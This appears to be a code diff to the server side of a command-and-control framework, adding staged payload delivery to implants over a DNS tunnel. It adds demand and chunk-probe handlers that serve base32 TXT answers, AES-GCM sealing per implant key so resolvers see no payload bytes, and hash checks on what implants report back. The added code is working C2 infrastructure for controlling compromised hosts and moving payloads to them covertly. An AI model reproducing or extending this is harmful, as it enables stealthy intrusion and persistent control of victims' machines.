@@ -89,6 +89,14 @@ internal sealed class DnsBeaconBridge
     // while a spoofed probe flood cannot pin memory.
     private const int MaxDeliveryAcks = 512;
 
+    // The staged-download store's bounds (ADR-010): entries hold a reference
+    // to the staged artifact's bytes (never a copy), so the count is the
+    // memory surface -- a handful of concurrent degraded downloads is the
+    // honest fleet's shape, and idle entries leave on the enroll window's
+    // timescale so an abandoned download cannot pin one.
+    private const int MaxStagedDownloads = 16;
+    private static readonly TimeSpan StagedDownloadIdle = TimeSpan.FromMinutes(10);
+
     private readonly ISessionRegistry _sessions;
     private readonly TaskService _tasks;
     private readonly IAuditStore _audit;
@@ -105,6 +113,8 @@ internal sealed class DnsBeaconBridge
     private readonly Rod.Transport.Channels.DegradedChannelHub _degraded;
     private readonly BeaconIngest _ingest;
     private readonly DnsContactNames.ResultReassembler _channelOutputs;
+    private readonly ITaskRepository _taskRecords;
+    private readonly IArtifactStore _artifacts;
     private readonly object _enrollGate = new();
     private readonly Dictionary<string, EnrollUpload> _enrollUploads = new();
     private readonly Dictionary<string, byte[]> _enrollAnswers = new();
@@ -126,6 +136,24 @@ internal sealed class DnsBeaconBridge
     private readonly Dictionary<string, byte> _deliveryAcks = new();
     private readonly List<string> _deliveryAckOrder = new();
 
+    // One staged download in flight (the s.-demand's token-keyed state): the
+    // served artifact's bytes by reference, the seam the demand's proof
+    // honored, and the seal halves when the demanding implant is key-bound --
+    // each d.-probe slices and (when sealed) wraps on demand, so no copy of
+    // the payload is taken and a fresh nonce seals every probe.
+    private sealed class StagedDownload
+    {
+        public required TaskId Task { get; init; }
+        public required long Start { get; init; }
+        public required byte[] Content { get; init; }
+        public Guid KeyId { get; init; }
+        public byte[]? Key { get; init; }
+        public DateTimeOffset Touched;
+    }
+
+    private readonly object _stagedGate = new();
+    private readonly Dictionary<string, StagedDownload> _stagedDownloads = new();
+
     public DnsBeaconBridge(
         ISessionRegistry sessions,
         TaskService tasks,
@@ -140,7 +168,9 @@ internal sealed class DnsBeaconBridge
         EnvelopeContactKeys contactKeys,
         IImplantRepository implants,
         Rod.Transport.Channels.DegradedChannelHub degraded,
-        BeaconIngest ingest)
+        BeaconIngest ingest,
+        ITaskRepository taskRecords,
+        IArtifactStore artifacts)
     {
         _sessions = sessions;
         _tasks = tasks;
@@ -156,6 +186,8 @@ internal sealed class DnsBeaconBridge
         _implants = implants;
         _degraded = degraded;
         _ingest = ingest;
+        _taskRecords = taskRecords;
+        _artifacts = artifacts;
         _results = new DnsContactNames.ResultReassembler(clock);
         _channelOutputs = new DnsContactNames.ResultReassembler(clock);
     }
@@ -565,10 +597,28 @@ internal sealed class DnsBeaconBridge
         if (unsealed is null)
             return;
 
+        // The both-side half over this grammar (ADR-010): the r.-chunks carry
+        // the output text alone, so a staged task's report rides its payload
+        // hash on the tail -- stripped here and verified against the served
+        // artifact with the same check the frame paths run.
+        var report = System.Text.Encoding.UTF8.GetString(unsealed);
+        var record = await _taskRecords.FindAsync(task, cancellationToken);
+        if (record?.StagedBytes is not null
+            && TryStripStagedHash(report, out var reported, out var stripped))
+        {
+            report = stripped;
+            if (!await Rod.Transport.Endpoints.BeaconIngest.StagedHashMatchesAsync(
+                    _artifacts, task, reported, cancellationToken))
+            {
+                outcome = Rod.CoreState.Tasks.TaskOutcome.Failed;
+                report = $"staged payload hash mismatch: implant reported {reported}: {stripped}";
+            }
+        }
+
         TaskCompleted completed;
         try
         {
-            completed = await _tasks.RecordResultAsync(task, System.Text.Encoding.UTF8.GetString(unsealed), outcome, cancellationToken);
+            completed = await _tasks.RecordResultAsync(task, report, outcome, cancellationToken);
         }
         catch (InvalidOperationException)
         {
@@ -670,6 +720,126 @@ internal sealed class DnsBeaconBridge
         // completion record to read, so the ledger is the confirmation a
         // re-sending sender probes.
         NoteDelivered(task, data);
+    }
+
+    /// <summary>
+    /// One staged-payload demand (ADR-010):
+    /// s.&lt;task&gt;.&lt;offset&gt;.&lt;proof&gt;.&lt;implant&gt;.
+    /// Presence rides the demand like every contact path; the task must be
+    /// the implant's own and hold staged bytes. The honored seam runs the
+    /// same prefix-proof validation the frame carriages run
+    /// (<see cref="BeaconTasking.ResolveResumeStart"/>), and the answer is
+    /// "=<b32 token>" naming a chunked download of the remainder -- sealed
+    /// per chunk for a key-bound implant, so the resolver chain reads no
+    /// payload bytes in the clear. Null (no TXT answer) for a demand this
+    /// listener cannot serve: the implant's idle guard owns that failure.
+    /// </summary>
+    public async Task<byte[]?> StagedDemandAsync(
+        ImplantId implant,
+        TaskId task,
+        long offset,
+        byte[]? prefixSha,
+        CancellationToken cancellationToken)
+    {
+        var session = await _sessions.GetActiveAsync(implant, cancellationToken);
+        if (session is null)
+            return null;
+        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);
+
+        var record = await _taskRecords.FindAsync(task, cancellationToken);
+        if (record is null || record.StagedBytes is null || record.ImplantId != implant)
+            return null;
+
+        var staged = (await _artifacts.ForTaskAsync(task.Value, cancellationToken))
+            .FirstOrDefault(a => a.Name == StagedArtifacts.NameFor(task.Value));
+        var content = staged?.Content ?? Array.Empty<byte>();
+        var start = BeaconTasking.ResolveResumeStart(content, (ulong)offset, prefixSha);
+
+        var bound = _contactKeys.TryGet(implant);
+        var token = Guid.NewGuid().ToByteArray();
+        lock (_stagedGate)
+        {
+            var now = _clock.GetUtcNow();
+            foreach (var stale in _stagedDownloads
+                         .Where(kv => now - kv.Value.Touched > StagedDownloadIdle)
+                         .Select(kv => kv.Key)
+                         .ToArray())
+            {
+                _stagedDownloads.Remove(stale);
+            }
+            while (_stagedDownloads.Count >= MaxStagedDownloads)
+            {
+                var lru = _stagedDownloads.Aggregate((a, b) => a.Value.Touched <= b.Value.Touched ? a : b).Key;
+                _stagedDownloads.Remove(lru);
+            }
+            _stagedDownloads[DnsContactNames.Encode(token)] = new StagedDownload
+            {
+                Task = task,
+                Start = start,
+                Content = content,
+                KeyId = bound?.KeyId ?? Guid.Empty,
+                Key = bound?.Key,
+                Touched = now,
+            };
+        }
+        return System.Text.Encoding.ASCII.GetBytes("=" + DnsContactNames.Encode(token));
+    }
+
+    /// <summary>
+    /// One staged-download chunk probe: d.&lt;token&gt;.&lt;seq&gt;, answered
+    /// "&lt;t|m&gt;.&lt;b32 chunk&gt;" -- the answer-sized slice at the seam
+    /// the demand honored, sealed per chunk under the staged tag for a
+    /// key-bound implant. A task whose staged bytes are gone answers its
+    /// first probe with the empty terminal chunk, the frame path's own
+    /// resolution shape. Null when the token names no download (expired,
+    /// evicted, or never issued): the client re-demands on its next cycle.
+    /// </summary>
+    public Task<byte[]?> StagedDownloadAsync(byte[] token, int sequence)
+    {
+        string part;
+        lock (_stagedGate)
+        {
+            if (!_stagedDownloads.TryGetValue(DnsContactNames.Encode(token), out var download))
+                return Task.FromResult<byte[]?>(null);
+            download.Touched = _clock.GetUtcNow();
+            if (download.Content.Length == 0 && sequence == 0)
+            {
+                part = "t." + DnsContactNames.Encode(Array.Empty<byte>());
+            }
+            else
+            {
+                var from = checked(download.Start + (long)sequence * AnswerChunkBytes);
+                if (from >= download.Content.Length)
+                    return Task.FromResult<byte[]?>(null);
+                var take = Math.Min(AnswerChunkBytes, download.Content.Length - from);
+                var slice = new byte[take];
+                Array.Copy(download.Content, from, slice, 0, take);
+                var terminal = from + take >= download.Content.Length;
+                if (download.Key is { } key)
+                    slice = AesGcmEnvelope.WrapBody(slice, download.KeyId, key, AesGcmEnvelope.DnsStagedAad);
+                part = (terminal ? "t." : "m.") + DnsContactNames.Encode(slice);
+            }
+        }
+        return Task.FromResult<byte[]?>(System.Text.Encoding.ASCII.GetBytes(part));
+    }
+
+    // Strips the staged report's tail token ("\nsha256:<64 hex>", the
+    // grammar this carriage carries the both-side hash on); false when the
+    // text carries no well-formed token.
+    private static bool TryStripStagedHash(string report, out string hash, out string stripped)
+    {
+        const string marker = "\nsha256:";
+        hash = string.Empty;
+        stripped = report;
+        var at = report.LastIndexOf(marker, StringComparison.Ordinal);
+        if (at < 0)
+            return false;
+        var hex = report[(at + marker.Length)..];
+        if (hex.Length != 64 || hex.Any(c => !Uri.IsHexDigit(c)))
+            return false;
+        hash = hex.ToLowerInvariant();
+        stripped = report[..at];
+        return true;
     }
 
     /// <summary>
